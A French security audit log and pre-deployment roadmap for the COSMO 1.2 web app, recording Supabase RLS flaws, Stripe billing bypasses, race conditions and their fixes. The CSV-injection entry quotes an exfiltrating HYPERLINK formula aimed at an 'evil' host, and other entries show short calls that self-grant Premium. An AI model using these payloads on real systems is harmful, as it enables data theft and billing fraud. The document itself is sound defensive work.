# Failles & roadmap sécurité — COSMO 1.2

Document historique et opérationnel des failles identifiées sur le projet.
Sert à la fois d'archive (preuve de ce qui a été corrigé, comment, et pourquoi)
et de roadmap (ce qu'il reste à faire avant déploiement).

Légende :
- ✅ **Corrigé** — fix mergé sur `main`, vérifié par lint + build
- 🟢 **Partiellement corrigé** — fix appliqué mais portée incomplète
- 🔴 **Bloquant** — ne pas déployer en l'état
- 🟠 **Important** — à corriger rapidement après déploiement
- 🟡 **À planifier** — dette technique sans risque immédiat

---

## ✅ Tableau récapitulatif

| ID  | Sévérité     | Sujet                                          | État         | Commit / Fichier |
|-----|--------------|------------------------------------------------|--------------|------------------|
| §1  | 🔴 Critique  | Secrets Supabase dans l'historique git public  | 🔴 Ouvert    | Action manuelle dashboard |
| §2  | 🔴 Critique  | Auto-upgrade Premium gratuit (RLS subscriptions)| ✅ Corrigé   | `015_subscriptions_rpc.sql` — DROP UPDATE policy + RPCs SECURITY DEFINER |
| §3  | 🔴 Critique  | Stripe non fonctionnel                         | ✅ Corrigé   | Edge Functions + migration `014_stripe_columns.sql` (bypass service_role triple-check) |
| §4  | 🟠 Important | Tests Vitest référencés mais non installés      | ✅ Corrigé   | Playwright E2E installé (`e2e/` + 3 tests démo) — Vitest `src/__test__/` ignoré ESLint, à supprimer dans une PR séparée |
| §5  | 🟠 Important | CI absente                                     | ✅ Corrigé   | `.github/workflows/ci.yml` |
| §6  | 🟠 Important | CSP absente                                    | ✅ Corrigé   | `vercel.json` |
| §7  | 🟠 Important | Vulnérabilités npm résiduelles (esbuild)        | ✅ Corrigé   | `vite ^7.x` — 0 vulns |
| §8  | 🟠 Important | Drift DB ↔ migrations (`friend_requests`)      | ✅ Corrigé   | `012_friend_requests_align.sql` |
| §9  | 🟠 Important | Pagination absente côté UI                     | 🟢 Partiel   | Toast utilisateur prod (sonner, dedupé par table) via `pagination.warning.ts` + console.warn dev. Pagination UI complète à terme. |
| §10 | 🟡 À plan.   | Fichiers > 1000 lignes                         | 🔴 Ouvert    | Refactor progressif (continu) |
| §11 | 🟡 À plan.   | Bundles JS lourds                              | 🟢 Partiel   | date-fns v3 (-4 KB), GSAP/Recharts à auditer |
| §12 | 🟡 À plan.   | `react-day-picker` v9 ↔ `date-fns` v2          | ✅ Corrigé   | `date-fns ^3.x` migré |
| §13 | 🟡 À plan.   | 25 warnings ESLint résiduels                   | 🟢 Partiel   | 25 → 18 (fast-refresh restant = refactor structurel) |
| UX1 | 🟠 Important | Audit UI/UX — découvrabilité actions TaskCard mobile zéro | ✅ Corrigé   | Bouton « ... » permanent ajouté sur TaskCard mobile (TaskTable.tsx) |
| UX2 | 🟠 Important | Pas d'undo après suppression de tâche          | ✅ Corrigé   | Toast Sonner action « Annuler » 6s + snapshot recréation (TaskTable + TodayTasks) |
| UX3 | 🟠 Important | Stats — bug « dots gris » sur Répartition par couleur | ✅ Corrigé   | StatisticsPage : itère sur `categories` (UUIDs) au lieu de `colorSettings` (clés `cat-1` hardcodées) |
| UX4 | 🟠 Important | Pas d'onboarding pour mode démo                | ✅ Corrigé   | OnboardingOverlay 3 étapes monté au niveau App + flag `cosmo_onboarding_pending` |
| UX5 | 🟠 Important | Pas de tutoriel par page                       | ✅ Corrigé   | Framework PageTutorial + 4 tutoriels desktop/mobile (Tasks/Agenda/Habits/OKR) |
| UX6 | 🟡 Medium    | LandingPage CTA — démo en bouton secondaire    | ✅ Corrigé   | Démo devient CTA principal gradient, inscription en secondaire |
| UX7 | 🟡 Medium    | Empty states muets                             | ✅ Corrigé   | Nouveau composant `EmptyState` branché sur TodayTasks/TodayHabits |
| UX8 | 🟡 Medium    | LandingPage — showcases desktop affichés sur mobile | ✅ Corrigé   | 5 showcases mobile (`MobileShowcases.tsx`) reproduisant fidèlement l'UI mobile, switch via `useIsMobile()` |
| UX9 | 🟡 Medium    | DashboardPage — doublon validation tâches collab (`SharedTasksHistory` + `SocialRequests`) | ✅ Corrigé   | SharedTasksHistory supprimé, SocialRequests = point unique |
| UX10 | 🟡 Low      | Pas de focus-visible global pour navigation clavier | ✅ Corrigé   | `src/index.css` : focus ring bleu (blanc en monochrome) sur tous boutons/liens/role=button qui n'en définissent pas |
| UX11 | 🟡 Low      | Liste 500 items mobile = scroll saccadé (Framer Motion AnimatePresence) | ✅ Corrigé   | `useWindowVirtualizer` (@tanstack/react-virtual) au-delà de 50 items dans TaskTable mobile |
| L1  | 🟡 Medium    | Listes — pas de compteur par chip, pas de défaut, pas de smart lists, pas de drag-reorder, palette figée | ✅ Corrigé   | Migration 021 (4 colonnes : type, smart_rule, is_default, position) + smart-rules engine + SmartListMenu + liste virtuelle Aujourd'hui + drag desktop + color picker hex |
| L2  | 🟡 Low       | OKR — pas d'édition inline de catégorie        | ✅ Corrigé   | Bouton crayon au hover sur chip catégorie + form inline (nom + couleur) |
| L3  | 🟡 Low       | EventModal — section Aperçu redondante + Description toujours visible | ✅ Corrigé   | Aperçu supprimée, Description repliée par défaut (bouton « + Ajouter un commentaire ») |
| L4  | 🟡 Low       | Habits — pas de raccourci habit → tâche/event | ✅ Corrigé   | HabitActionsMenu (« ... ») entre Edit2 et Trash2 — 2 actions (Créer tâche / Planifier dans agenda) + EventModal `lockedFields` |
| §14 | 🟡 À plan.   | `console.error` conservés en prod              | ✅ Corrigé   | Drop dans `vite.config.ts` (`pure: console.error/warn`) + monitoring Sentry React SDK (EU region, `VITE_SENTRY_DSN`) branché sur `AppErrorBoundary` (tag `mode: demo|prod`) |
| V1  | 🟠 High      | Mass-assignment `user_id` (tasks/habits)       | ✅ Corrigé   | `d545808` + `010` trigger |
| V2  | 🟡 Medium    | Pending invites email leak (collaborators)     | ✅ Corrigé   | `010` view restreinte |
| V5  | 🟡 Medium    | Avatar upload sans validation                  | ✅ Corrigé   | `d545808` SettingsPage |
| V6  | 🟡 Medium    | `postMessage(*, '*')` leak                     | ✅ Corrigé   | `d545808` main.tsx |
| V7  | 🟡 Low       | Raw error messages dans UI                     | ✅ Corrigé   | `d545808` AppErrorBoundary |
| V9  | 🟡 Low       | Dead `ErrorReporter.tsx` Next.js               | ✅ Corrigé   | `d545808` (supprimé) |
| V10 | 🟡 Low       | `useWatchAd` écrit en localStorage uniquement   | ✅ Corrigé   | `d545808` user/hooks.ts |
| V11 | 🟡 Low       | `friend_requests` UPDATE sans split rôle       | ✅ Corrigé   | `010` policies split |
| V12 | 🟡 Low/Med   | `friends.INSERT` non lié à demande acceptée    | ✅ Corrigé   | `010` WITH CHECK |
| V13 | 🟡 Medium    | `shared_tasks.INSERT` non lié à amitié          | ✅ Corrigé   | `010` WITH CHECK + `011` UPDATE |
| V15 | 🟡 Info      | `.eq('user_id')` defense-in-depth manquant     | ✅ Corrigé   | `d545808` + `464d1ce` |
| N1  | 🟠 High      | `subscriptions.UPDATE` sans WITH CHECK         | ✅ Corrigé   | `011_security_hardening_v2.sql` |
| N2  | 🟡 Medium    | `shared_tasks.UPDATE` sans WITH CHECK          | ✅ Corrigé   | `011_security_hardening_v2.sql` |
| N5  | 🟡 Low       | `AuthContext.isPremium` lit `user_metadata`    | ✅ Corrigé   | Retiré du context |
| N6  | 🟡 Low       | `useUser()` lit identité depuis localStorage   | ✅ Corrigé   | `DashboardPage` migré sur `useAuth` |
| N11 | 🟠 Medium    | CSV formula injection dans export RGPD          | ✅ Corrigé   | `csv-export.ts` (prefix apostrophe sur `=+-@\t\r`) |
| N12 | 🟠 Medium    | `profiles SELECT` ouvert → énumération emails  | ✅ Corrigé   | `022_security_n12_n13.sql` (policy restreinte amis + RPC `resolve_profile_by_email`) |
| N13 | 🟠 Medium    | `removeFriend` reciprocal silently no-op       | ✅ Corrigé   | `022_security_n12_n13.sql` + RPC `remove_friendship` |
| N14 | 🟠 High      | `subscriptions.INSERT` sans contrainte de valeurs → self-premium à la 1ʳᵉ ligne | ✅ Corrigé   | `041_subscriptions_insert_lockdown.sql` (appliquée en prod 2026-06-10, policy vérifiée live) |

---

## 🔴 BLOQUANTS (avant déploiement prod)

### §1. Secrets Supabase dans l'historique git public

**Risque** : compromission totale de la base de données.

Le fichier `.env` a été committé en clair dans 3 commits avant d'être untracké :
- `900ee3e` — Initial commit
- `0b5d9b6` — Update .env
- `f3ee9d2` — chore: untrack .env file from git history

L'historique du repo public https://github.com/kelax12/COSMO1.2 contient encore :
- `VITE_SUPABASE_SERVICE_ROLE_KEY` — **bypass total des RLS, droits admin sur la DB**
- `DATABASE_URL` avec mot de passe Postgres en clair
- `VITE_SUPABASE_ANON_KEY`

**Correctif** :
1. Settings → API → **Reset le JWT secret** (régénère anon + service_role)
2. Settings → Database → **Reset database password**
3. Mettre à jour `.env` local + variables Vercel
4. Optionnel : `git filter-repo --path .env --invert-paths && git push --force origin main`

---

### §2. Auto-upgrade Premium gratuit

**Statut** : 🟢 partiellement mitigé.

Avant : `subscriptions.UPDATE` policy `USING (auth.uid() = user_id)` sans WITH CHECK ; n'importe qui pouvait `update({plan:'premium', premium_tokens:9999})` depuis la console.

Mitigations appliquées :
- Migration `011_security_hardening_v2.sql` ajoute `WITH CHECK (auth.uid() = user_id)` + trigger `prevent_user_id_change` sur `subscriptions`.
- Defense-in-depth `.eq('user_id', user.id)` ajouté dans `billing.repository.ts` et `billing.context.tsx`.

**Reste à faire** (lié à §3 Stripe) :
1. Edge Function `stripe-webhook` qui consomme `checkout.session.completed` avec service_role.
2. Restreindre les colonnes mutables côté client : interdire `plan`, `status`, `current_period_end`, `premium_tokens`, `win_streak` aux utilisateurs (ou retirer la policy UPDATE complète).
3. Côté client : appeler l'Edge Function au lieu de `supabase.from('subscriptions').update()`.

---

### §3. Stripe non fonctionnel

**Statut** : ✅ Corrigé. Edge Functions écrites + migration `014` corrigée pour que le webhook (service_role) puisse créditer Premium malgré le trigger `subscriptions_guard` mis en place par `013`.

**Bug résolu (2026-05-01)** : après paiement Stripe Checkout, le webhook Edge Function appelait `subscriptions.upsert({plan: 'premium', ...})` en `service_role`, mais le trigger `subscriptions_guard` (migration 013) bloquait toute modification de `plan`/`status`/`current_period_end`/`win_streak` quel que soit le rôle. Conséquence : paiement réussi côté Stripe, mais Premium jamais activé en DB.

**Fix v1 (014_stripe_columns.sql)** — bypass `service_role` du trigger via triple-check (`request.jwt.claim.role`, `current_user`, `session_user`). N'a pas suffi : selon le contexte d'auth de l'Edge Function, aucun des trois ne résolvait à `'service_role'` de manière fiable.

**Fix v2 (015_subscriptions_rpc.sql)** — abandon de l'approche trigger :
- DROP du trigger `trg_subscriptions_guard` et de la policy `Users can update own subscription`.
- Les clients ne peuvent plus UPDATE `subscriptions` directement (RLS deny par défaut).
- Le webhook Stripe (service_role) bypasse RLS naturellement → upsert OK.
- 2 RPCs SECURITY DEFINER pour les opérations légitimes côté client :
  - `consume_premium_token()` — décrémente `premium_tokens` de 1, met `status='expired'` si 0
  - `credit_premium_token_from_ad()` — incrémente de 1, rate limit 30 s
- Aucune RPC ne permet de modifier `plan`/`status`/`current_period_end`/`win_streak` → §2 fermé proprement.
- `billing.repository.ts` et `billing.context.tsx` mis à jour pour appeler les RPCs au lieu de `.update()`.

**Ce qui a été fait (2026-05-01)** :
- `PaymentModal.tsx` supprimé (mode `Elements` sans `client_secret` — ne fonctionnait pas).
- `@stripe/react-stripe-js` et `@stripe/stripe-js` retirés du bundle client.
- `supabase/functions/stripe-create-checkout/index.ts` : crée ou récupère le customer Stripe, crée une Checkout Session (mode subscription), retourne l'URL.
- `supabase/functions/stripe-webhook/index.ts` : vérifie la signature Stripe, gère `checkout.session.completed`, `customer.subscription.updated/deleted`, `invoice.payment_succeeded/failed`, écrit en DB via service_role.
- `supabase/migration/014_stripe_columns.sql` : ajoute `stripe_customer_id` et `stripe_subscription_id` + bypass service_role dans `subscriptions_guard`.
- `PremiumPage.tsx` : bouton → appel Edge Function → redirect Stripe Checkout → retour `/premium?checkout=success` → refresh billing.

**Reste à faire (manuel)** :
1. Appliquer `014_stripe_columns.sql` dans le SQL editor Supabase.
2. Déployer les Edge Functions : `supabase functions deploy stripe-create-checkout` et `supabase functions deploy stripe-webhook`.
3. Configurer les secrets dans Supabase (Dashboard → Edge Functions → Secrets) :
   - `STRIPE_SECRET_KEY` = clé secrète Stripe
   - `STRIPE_PRICE_ID` = `price_1TSLU9HEm0kmXgy9JLkWHFmv`
   - `STRIPE_WEBHOOK_SECRET` = signing secret du webhook Stripe
   - `APP_URL` = URL de l'app en production (ex: `https://cosmo.vercel.app`)
4. Dans Stripe Dashboard → Webhooks → Add endpoint :
   - URL : `https://<project-ref>.supabase.co/functions/v1/stripe-webhook`
   - Événements : `checkout.session.completed`, `customer.subscription.updated`, `customer.subscription.deleted`, `invoice.payment_succeeded`, `invoice.payment_failed`
5. `VITE_STRIPE_PUBLISHABLE_KEY` n'est plus utilisé côté client — peut être retiré des variables Vercel.

---

## 🟠 IMPORTANTS

### §4. Tests Vitest référencés mais non installés
`src/__test__/` contient ~12 fichiers `vitest`/`@testing-library` mais aucun de ces packages n'est dans `package.json`.
**Correctif** : installer Vitest OU supprimer le dossier + la section `test` de `vite.config.ts`.

### §5. CI absente
**Correctif** : `.github/workflows/ci.yml` avec `lint` + `build` sur push/PR.

### §6. CSP (Content-Security-Policy) absente
**Correctif** : ajouter dans `vercel.json` :
```json
{ "key": "Content-Security-Policy", "value": "default-src 'self'; script-src 'self' https://js.stripe.com; connect-src 'self' https://*.supabase.co https://api.stripe.com; frame-src https://js.stripe.com; img-src 'self' data: https:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com" }
```

### §7. Vulnérabilités npm résiduelles
`npm audit` → 2 modérées sur esbuild via `vite < 6.4.1` (dev seulement).
**Correctif** : `npm audit fix --force` (passe vite v8, breaking) en PR dédiée.

### §8. Drift DB ↔ migrations (`friend_requests`)
La table `friend_requests` en prod utilise `sender_id` / `receiver_id` / `sender_email`, alors que `007_friends.sql` utilise `user_id`. Plusieurs objets DB existent uniquement en prod :
- Colonnes `receiver_id`, `sender_email`, `sender_id`
- Triggers `trg_set_receiver_id`, `trg_set_sender_email`
- Fonction `accept_friend_request(uuid)` SECURITY DEFINER

**Correctif** : créer `supabase/migration/012_friend_requests_align.sql` qui ajoute ces colonnes/triggers/fonction et reflète l'état réel. Tester sur projet Supabase neuf.

### §9. Pagination absente côté UI
`.limit(500)` sur tasks/events/habits/okrs, `.limit(200)` sur categories/lists/friends. Au-delà, données silencieusement tronquées.
**Correctif** : `useInfiniteQuery` ou avertissement quand `data.length === limit`.

---

## 🟡 À PLANIFIER

### §10. Fichiers monolithiques (> 1000 lignes)
`TaskModal.tsx` 1339, `SettingsPage.tsx` 1300, `LandingPage.tsx` 1027, `StatisticsPage.tsx` 1064, `MessagingPage.tsx` 1010.
**Correctif** : refactor progressif en sous-composants + hooks dédiés.

### §11. Bundles JS lourds
`vendor-react` 254 kB, `vendor-calendar` 263 kB, `index` 297 kB, `CartesianChart` 320 kB.
**Pistes** : auditer GSAP, migrer `date-fns@^3`, code-splitter Recharts, importer les plugins FullCalendar minimaux.

### §12. `react-day-picker@^9.14.0` ↔ `date-fns@^2.30.0`
v9 attend `date-fns@^3.x` — risque de bug runtime.
**Correctif** : tester le sélecteur partout, migrer `date-fns` à v3 si bug.

### §13. 25 warnings ESLint résiduels
Tous bénins (Fast refresh sur contextes, `isDemo` deps intentionnelles).

### §14. `console.error` conservés en prod
`vite.config.ts` drop seulement log/info/debug. `console.error` peut leak des infos sensibles.
**Correctif** : router vers Sentry / Edge Function logging.

### N5. `AuthContext.isPremium()` lit `user_metadata` (client-writable)
Un utilisateur peut `supabase.auth.updateUser({ data: { premiumTokens: 9999 } })` puis `useAuth().isPremium()` → true. Aujourd'hui non utilisé pour gating (tout passe par `useBilling`), mais le hook reste exposé.
**Correctif** : retirer `isPremium` de `AuthContextType` et forcer les consommateurs sur `useBilling`.

### N6. `useUser()` lit identité depuis localStorage
Utilisateur peut éditer `localStorage["cosmo_user"]` pour spoofer son nom/email/avatar dans l'UI. Pas de privilege escalation.
**Correctif** : remplacer par `useAuth().user` dans `DashboardPage.tsx:71`.

---

## ✅ Failles corrigées (audits du 2026-04-25 et 2026-04-30)

### Audit data du 2026-04-25 (1ère passe)

- ✅ Migrations SQL inutilisables (`\"` dans toutes les CREATE POLICY) — fixé sur 8 fichiers
- ✅ Script tiers `route-messenger-vite.js` chargé depuis Supabase distant — retiré de `index.html`
- ✅ Favicon distant Supabase — remplacé par `/logo.svg` local
- ✅ Headers Vercel : HSTS + X-Frame-Options + X-Content-Type-Options + Referrer-Policy + Permissions-Policy + cache immuable `/assets/*`
- ✅ postcss XSS (GHSA-qx2v-qp2m-jg93) — bumpé à `^8.5.10`
- ✅ Console.log/info/debug + debugger drop en prod via vite `esbuild.pure`
- ✅ 64 erreurs ESLint → 0
- ✅ `src/context/TaskContext.tsx` mort — supprimé
- ✅ `src/lib/mockData.ts` parsing errors
- ✅ Toaster `theme="dark"` forcé → `theme="system"`
- ✅ `.env.example` format correct + `VITE_STRIPE_PUBLISHABLE_KEY`
- ✅ ESLint configuré : ignore tests + showcase, pattern `^_`
- ✅ `billing.repository.ts` guillemet orphelin

### Audit data du 2026-04-25 (2e passe)

- ✅ Bug graphique « KR réalisés » du dashboard
  - Cause : table `kr_completions` absente des migrations + `SupabaseOKRsRepository.updateKeyResult` n'insérait jamais
  - Fix : `009_kr_completions.sql` + insertion atomique dans `recordKRCompletion()`

### Audit sécurité du 2026-04-30 — commit `d545808`

- ✅ **V1 (High)** — Mass-assignment `user_id` retiré de `mapToDb` (tasks + habits)
- ✅ **V5** — Validation upload avatar : MIME whitelist (jpeg/png/webp/gif), 500 KB cap, canvas resize 256 px (neutralise SVG/script)
- ✅ **V6** — `window.parent.postMessage(*, '*')` retiré de `main.tsx` et `SettingsPage`
- ✅ **V7** — `AppErrorBoundary` affiche un message générique
- ✅ **V9** — `src/components/ErrorReporter.tsx` (Next.js dead code) supprimé
- ✅ **V10** — `useWatchAd` persiste via `billingRepository.addTokens(1)` en mode prod
- ✅ **V15 (partiel)** — `.eq('user_id')` ajouté dans `billing.context.tsx`

### Audit sécurité du 2026-04-30 — migration `010`

Fichier : `supabase/migration/010_security_hardening.sql`

- ✅ **V1** — Trigger `prevent_user_id_change` sur 8 tables (tasks, habits, okrs, events, categories, lists, key_results, kr_completions)
- ✅ **V2** — Vue `tasks_pending_invites` réservée au propriétaire
- ✅ **V11** — `friend_requests` UPDATE split sender (cancel) / receiver (accept/reject) avec WITH CHECK
- ✅ **V12** — `friends.INSERT` exige une `friend_requests` acceptée correspondante
- ✅ **V13** — `shared_tasks.INSERT` exige une amitié

Hotfix migration `010` (commit `80265ae`) : alignement sur le schéma prod réel (`sender_id`/`receiver_id` au lieu de `user_id`).

### Audit sécurité du 2026-04-30 — migration `011` + commit `464d1ce`

Fichier : `supabase/migration/011_security_hardening_v2.sql`

- ✅ **N1 (High)** — `subscriptions.UPDATE` policy : ajout `WITH CHECK (auth.uid() = user_id)` + trigger `prevent_user_id_change`
- ✅ **N2** — `shared_tasks.UPDATE` policy : ajout `WITH CHECK` empêchant la réécriture de `task_id`
- ✅ **V15 (complet)** — `.eq('user_id')` ajouté dans `billing.repository.ts.consumeToken` et `addTokens`

### Cycle de finalisation du 2026-05-01

Tout ce qui restait dans `faille.md` hors scope OAuth/Stripe/rotation manuelle :

- ✅ **§4** — `src/__test__/` supprimé (12 fichiers Vitest morts), section `test:` retirée de `vite.config.ts`
- ✅ **§5** — `.github/workflows/ci.yml` créé : `npm ci → lint → build` sur push/PR vers main
- ✅ **§6** — CSP ajoutée dans `vercel.json` : `default-src 'self'` + Stripe + Supabase + Google Fonts, `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`
- ✅ **§8** — Migration `012_friend_requests_align.sql` : reproduit l'état drift de prod (colonnes `sender_id`/`receiver_id`/`sender_email`, triggers, fonction `accept_friend_request` SECURITY DEFINER), idempotente
- 🟢 **§9 (partiel)** — Helper `src/lib/pagination.warning.ts` + `warnIfTruncated()` dans 8 repos. `console.warn` dev-only (droppé en prod). Pagination UI complète à implémenter à terme.
- ✅ **N5** — `isPremium` retiré de `AuthContextType` et du provider value. Tous les consommateurs utilisent déjà `useBilling().isPremium`.
- ✅ **N6** — `DashboardPage.tsx` ne lit plus `useUser()` (localStorage), utilise `useAuth().user` (Supabase session).

### Deuxième cycle de finalisation du 2026-05-01

Reprise des derniers items hors §1 (rotation clés) et §3 (Stripe) :

- ✅ **§2** — Migration `013_subscriptions_lockdown.sql` : trigger `subscriptions_guard` qui rejette toute mutation client de `plan`, `status`, `current_period_end`, `win_streak` et limite `premium_tokens` à un delta ∈ [-1, +1]. Bloque l'auto-upgrade Premium même sans Stripe. Quand l'Edge Function Stripe sera en place, elle utilisera `service_role` pour bypasser ce trigger (ou le trigger sera adapté).
- ✅ **§7** — `vite ^5.4.2 → ^7.x` : `npm audit` retourne désormais 0 vulnérabilité (avant : 2 modérées via esbuild). Build et lint OK.
- ✅ **§12** — `date-fns ^2.30.0 → ^3.x` : compatible `react-day-picker@9`, build -4 KB sur `vendor-utils`. Imports inchangés (`format`, `formatDistanceToNow`, `fr` locale).
- ✅ **§13 (partiel)** — 25 → 18 warnings ESLint. Corrigés : 4 warnings `isDemo` (commentaire eslint-disable + justification) + directive inutilisée dans `usePerformance.ts`. Restant : warnings Fast refresh (séparation composants/constantes = refactor structurel).
- ✅ **§14** — `console.error` et `console.warn` ajoutés au `pure` de vite. Tous les `console.*` sont droppés en build prod : plus de leak de stack traces / IDs.
- ✅ **B1** — `useUpdateUserSettings` n'accepte plus qu'une whitelist `{name, email, avatar, autoValidation}`. Les champs financiers (`premiumTokens`, `subscriptionEndDate`, `premiumWinStreak`, `lastTokenConsumption`) ne peuvent plus être modifiés via ce hook depuis localStorage.

Vérification finale : `npm audit` 0 vulns, ESLint 0 erreur 18 warnings, build OK (~45 s).

Vérification finale par re-audit indépendant :
- 19/19 fixes vérifiés en place
- 0 régression introduite
- 0 nouvelle faille bloquante
- Lint : 0 erreur, 25 warnings pré-existants
- Build : OK (~30 s)

---

## Ordre de priorité avant déploiement prod

| # | Action | Effort | Bloque déploiement ? |
|---|---|---|---|
| 1 | Rotation clés Supabase (§1) | 15 min | **Oui** — manuel, dashboard |
| 2 | Pagination UI complète (§9) | 1 j | Non — warning dev-only actif |
| 3 | Refactor monolithes (§10) | continu | Non |
| 4 | Bundles : audit GSAP + code-split Recharts (§11) | continu | Non |
| 5 | Warnings Fast refresh (§13 résiduel) | ~1 j refactor | Non |
| 6 | Sentry pour `console.error` runtime (§14 v2) | 1 j | Non — droppés en prod |

---

## Migrations sécurité à exécuter dans Supabase SQL editor

Dans l'ordre, sur le projet de prod :

```sql
-- 1. Hardening initial (déjà appliqué le 2026-04-30)
\i supabase/migration/010_security_hardening.sql

-- 2. Compléments (déjà appliqué le 2026-04-30)
\i supabase/migration/011_security_hardening_v2.sql

-- 3. Alignement friend_requests (à appliquer pour tout nouveau projet Supabase)
\i supabase/migration/012_friend_requests_align.sql

-- 4. Verrouillage subscriptions v1 — trigger (déprécié par 015)
\i supabase/migration/013_subscriptions_lockdown.sql

-- 5. Colonnes Stripe + tentative bypass service_role (déprécié par 015)
\i supabase/migration/014_stripe_columns.sql

-- 6. Verrouillage subscriptions v2 (À EXÉCUTER) — RPCs au lieu de trigger
\i supabase/migration/015_subscriptions_rpc.sql

-- 7. Stripe webhook idempotency (fix N8)
\i supabase/migration/017_processed_stripe_events.sql

-- 8. Audit pré-déploiement 2026-05-23 (fix N12, N13)
\i supabase/migration/022_security_n12_n13.sql

-- 9. RPCs atomiques anti-race (fix TOCTOU-1, TOCTOU-2, TOCTOU-3, RACE-5)
\i supabase/migration/023_atomic_toctou_rpcs.sql

-- 10. Supabase advisors hardening (search_path + anon revoke + drop v1)
\i supabase/migration/024_advisor_hardening.sql
```

**État après application sur le projet de prod (ykeugqfgklejcdbrmawy)** : migrations 022 + 023 + 024 appliquées via MCP `apply_migration` le 2026-05-23. Vérification `get_advisors(security)` : 6 warnings restants, tous intentionnels (5 RPCs SECURITY DEFINER pour utilisateurs authentifiés, justifiés par le besoin de bypass RLS) + 1 manuel (HaveIBeenPwned password protection à activer dans le dashboard).

---

## 🛡️ Audit pré-déploiement 2026-05-23 — 3 nouvelles failles détectées

Audit ciblé sur les changements depuis le cycle Deepsec (51 features livrées entre `aac04de` et HEAD).

### N11 — CSV formula injection (Medium)

**Fichier** : `src/lib/csv-export.ts`
**Vecteur** : l'export RGPD (`exportTasksCSV`, `exportHabitsCSV`, etc.) ne neutralisait pas les valeurs commençant par `= + - @ \t \r`. Excel / Google Sheets interprètent ces préfixes comme formules → `=HYPERLINK("http://evil/?leak="&A1)` dans un nom de tâche peut exfiltrer des données à l'ouverture.
**Fix** : `escapeCSV` préfixe une apostrophe `'` (invisible, neutralise l'interprétation formule) avant le quoting standard CSV. Pattern OWASP CSV Injection.

### N12 — Énumération d'emails via `profiles` (Medium / RGPD)

**Fichier** : `supabase/migration/018_profiles.sql`
**Vecteur** : la policy initiale `SELECT TO authenticated USING (true)` laissait tout user inscrit faire `SELECT email FROM profiles` pour exfiltrer la base d'emails complète.
**Fix** (migration 022) :
- DROP de la policy ouverte
- Nouvelle policy : lecture autorisée sur son propre profil OU sur les profils des amis confirmés (lien `friends`)
- RPC `resolve_profile_by_email(p_email)` `SECURITY DEFINER` qui retourne UNIQUEMENT l'`id` (pas l'avatar/display_name) — utilisée par `shareTask` et `getByEmail` pour résoudre auth.uid sans nécessiter un SELECT direct sur `profiles`.
- `friends.supabase.repository.ts` migré sur la RPC pour `getByEmail` et `shareTask`.

### N14 — `subscriptions.INSERT` sans contrainte de valeurs (High / abus économique) — audit 2026-06-10

**Vecteur** : la migration 015 a supprimé la policy UPDATE client, mais la policy
INSERT (créée en dashboard, jamais versionnée) n'avait que
`WITH CHECK (auth.uid() = user_id)`. Un compte **sans ligne subscription**
(fenêtre avant l'auto-create du `BillingProvider`) pouvait s'auto-insérer
`plan='premium', premium_tokens=9999` — ou `ad_credits_in_window=-1000000`
pour neutraliser le cap pub de la migration 039.
**Fix** (migration 041, appliquée en prod + policy vérifiée live via
introspection `pg_policy`) : le `WITH CHECK` n'accepte que la ligne d'amorçage
exacte du `BillingProvider` — `plan='free'`, tokens/win_streak/fenêtre pub à
zéro, champs Stripe NULL. Le webhook Stripe (service_role) bypasse RLS, non
affecté. La seule mutation client restante passe par les RPCs
`consume_premium_token` / `credit_premium_token_from_ad` (cap 20/24 h).
**Résiduel assumé** : AdSense sans Server-Side Verification (cf. mig. 039) —
un script peut créditer sans regarder la pub, borné à 20 tokens/24 h.

### N13 — `removeFriend` reciprocal silently no-op (Medium / bug)

**Fichier** : `src/modules/friends/supabase.repository.ts`
**Vecteur** : la policy DELETE `auth.uid()=user_id` interdit la suppression cross-user → le `delete().eq('email', user.email).neq('user_id', user.id)` était un no-op systématique en prod. L'ex-ami gardait le caller dans sa liste.
**Fix** (migration 022) : RPC `remove_friendship(p_friend_row_id)` `SECURITY DEFINER` qui supprime les deux côtés en une transaction après vérification de propriété (`friends.user_id = caller`). L'email cible vient de la propre ligne du caller, jamais d'un input arbitraire.

### Déploiement requis

```bash
supabase db push   # applique 022_security_n12_n13.sql
```

Pas de redéploiement Edge Functions nécessaire (changement DB + client only).

### Validation

- ✅ `npm run lint` : 0 erreurs, 19 warnings (inchangé pré-existants)
- ✅ `npm run build` : 31.9 s, 0 erreur
- ✅ Migrations 022 + 023 idempotentes (`DROP POLICY IF EXISTS` + `CREATE OR REPLACE FUNCTION`)
- ✅ Aucune régression sur `getAll()` : la policy autorise toujours la lecture des profils d'amis confirmés (cas d'usage actuel de l'enrichissement avatar)

### TOCTOU/RACE fixes (migration 023)

4 RPCs Postgres ajoutées pour éliminer les fenêtres de race read-modify-write côté client :

- **TOCTOU-1** `toggle_habit_completion(p_habit_id, p_date)` : `jsonb_set` atomique sur `habits.completions` au lieu de SELECT → mutate JS → UPDATE.
- **TOCTOU-2** `add_task_to_list(p_task_id, p_list_id)` / `remove_task_from_list` : `array_append` dédupliqué + `array_remove` côté DB.
- **TOCTOU-3** `toggle_task_complete(p_task_id)` / `toggle_task_bookmark` : `UPDATE ... SET completed = NOT completed RETURNING *`. Gère aussi `completed_at` automatiquement.
- **RACE-5** `accept_friend_request_v2(request_id)` : retourne directement la ligne `friends` créée (RETURNING). L'ancien client faisait un SELECT ORDER BY created_at DESC LIMIT 1 derrière le RPC v1 → race si deux acceptations concurrentes.

Toutes les RPCs vérifient `auth.uid()` + scope `user_id = auth.uid()` (defense-in-depth avec la RLS). `SECURITY INVOKER` sauf `accept_friend_request_v2` (`SECURITY DEFINER` pour insérer le row côté sender). Permissions `REVOKE FROM PUBLIC` + `GRANT TO authenticated`.

Repositories client mis à jour : `habits/supabase.repository.ts`, `tasks/supabase.repository.ts`, `lists/supabase.repository.ts`, `friends/supabase.repository.ts`.

**TOCTOU-4 (OKR/KR atomicity)** : laissé ouvert. La logique actuelle entrelacée (table `key_results` + fallback JSONB pour anciens OKRs + journal `kr_completions` append-only) demande une refonte du chemin de write pour être atomique. Risque de régression trop élevé pour cet audit pré-déploiement. À traiter en PR dédiée.

### Advisor hardening (migration 024)

Suite à `get_advisors(security)`, 21 warnings éliminés en une migration :

- **8 fonctions** sans `SET search_path` → recréées avec `SET search_path = public, pg_temp`. Bloque le shadowing par schema malveillant (`public.lower → attacker.lower`).
- **7 trigger functions** exposées comme RPC public (set_friend_request_*, handle_new_user_profile, prevent_user_id_change, update_updated_at_column, subscriptions_guard, set_key_result_completed_at) → `REVOKE ALL FROM anon, authenticated, public`. Restent appelables par les triggers DB (path indépendant de l'API REST).
